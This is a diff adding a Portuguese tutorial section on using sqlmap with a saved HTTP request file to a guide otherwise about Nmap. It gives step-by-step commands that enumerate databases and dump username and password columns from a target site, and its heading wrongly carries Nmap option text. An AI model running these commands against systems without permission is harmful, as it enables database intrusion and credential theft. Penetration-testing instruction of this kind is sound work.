@@ -265,6 +265,88 @@ A opção `T<0-5>` (**0** para a analise mais aprofundada e lenta; **5** para an
 
 ----
 
+## Sqlmap (-r | Scan ports sequentially - don't randomize)
+
+O comando `-r` no SQLMap permite que você forneça um arquivo contendo uma requisição HTTP completa. Isso é útil quando você precisa passar cookies, cabeçalhos personalizados, dados de formulário ou qualquer outro detalhe específico da requisição HTTP que não pode ser facilmente passado via linha de comando.
+Usar a opção `-r` no SQLMap é extremamente útil para cenários complexos onde a requisição HTTP contém múltiplos cabeçalhos, cookies ou dados de formulário. Isso permite uma maior flexibilidade e precisão ao testar vulnerabilidades de injeção SQL em aplicativos web. Certifique-se de sempre usar essas ferramentas de maneira ética e somente em sistemas para os quais você tem permissão explícita para testar.
+
+
+### Passo a Passo para Utilizar SQLMap com o Arquivo de Requisição HTTP
+
+#### 1. **Capturar a Requisição HTTP**
+
+Use uma ferramenta como Burp Suite, OWASP ZAP, ou as ferramentas de desenvolvedor do seu navegador para capturar a requisição HTTP completa que você deseja testar.
+
+#### 2. **Salvar a Requisição HTTP em um Arquivo**
+
+Salve a requisição HTTP capturada em um arquivo de texto. O arquivo deve conter todos os detalhes da requisição, incluindo o método HTTP, URL, cabeçalhos e corpo, se aplicável.
+
+Exemplo de arquivo de requisição HTTP (`request.txt`):
+
+```
+GET /cat.php?id=1 HTTP/1.1
+Host: www.bancocn.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: PHPSESSID=1234567890abcdef
+Upgrade-Insecure-Requests: 1
+```
+
+#### 3. **Executar SQLMap com o Arquivo de Requisição**
+
+Use a opção `-r` para passar o arquivo de requisição para o SQLMap:
+
+```bash
+sqlmap -r request.txt
+```
+
+#### 4. **Executar SQLMap com Opções Adicionais**
+
+Você pode adicionar outras opções do SQLMap conforme necessário. Por exemplo, para listar bancos de dados:
+
+```bash
+sqlmap -r request.txt --dbs
+```
+
+### Exemplo Completo
+
+Aqui está um exemplo completo que inclui a identificação de vulnerabilidade, listagem de bancos de dados, tabelas e colunas, e extração de dados, tudo usando um arquivo de requisição HTTP:
+
+1. **Identificar a Vulnerabilidade:**
+
+```bash
+sqlmap -r request.txt
+```
+
+2. **Listar Bancos de Dados:**
+
+```bash
+sqlmap -r request.txt --dbs
+```
+
+3. **Listar Tabelas em um Banco de Dados Específico:**
+
+```bash
+sqlmap -r request.txt -D testdb --tables
+```
+
+4. **Listar Colunas em uma Tabela Específica:**
+
+```bash
+sqlmap -r request.txt -D testdb -T users --columns
+```
+
+5. **Extrair Dados de Colunas Específicas:**
+
+```bash
+sqlmap -r request.txt -D testdb -T users -C username,password --dump
+```
+
+----
+
 ### Conclusão
 
 O Nmap é uma ferramenta poderosa e flexível para análise de rede e auditoria de segurança. Com seus diversos modos de varredura e opções avançadas, ele pode fornecer informações detalhadas sobre a infraestrutura de rede, ajudando administradores e profissionais de segurança a proteger melhor seus ambientes. Para um uso mais avançado, explorar a documentação oficial e praticar com diferentes cenários é altamente recomendado.
